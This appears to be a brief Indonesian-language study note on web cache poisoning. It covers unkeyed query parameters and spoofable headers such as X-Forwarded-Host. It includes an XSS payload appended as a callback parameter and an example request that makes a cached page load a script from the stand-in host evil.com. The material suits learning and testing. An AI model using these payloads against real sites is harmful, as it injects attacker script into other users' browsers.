# web posoning

1. Unkeyed Input Cache Poisoning (Paling umum)

   # Cache tidak memasukkan parameter tertentu sebagai cache key, tapi backend tetap memprosesnya.

   - GET /search?q=sepatu => GET /search?q=sepatu&callback=<script>alert(1)</script> => jika tidak di filter dengan baik maka user bisa terkena xss
   - GET / => ubah menjadi GET /?test=1 check jika awal hit menjadi miss maka kemungkinan rentan

2. Header-based Cache Poisoning

   # Input berbahaya dikirim lewat HTTP Header, bukan URL.

   Header yang sering rawan
   
    - X-Forwarded-Host
    - X-Forwarded-Proto
    - X-Host
    - X-Original-URL
    - X-Rewrite-URL
    - Host
    - Forwarded
  
      # Contoh

      # Request
        GET / HTTP/1.1
        Host: target.com
        X-Forwarded-Host: evil.com

      # Response

        <script src="https://evil.com/app.js"></script> => Dampak : XSS Storage dan UI defacement
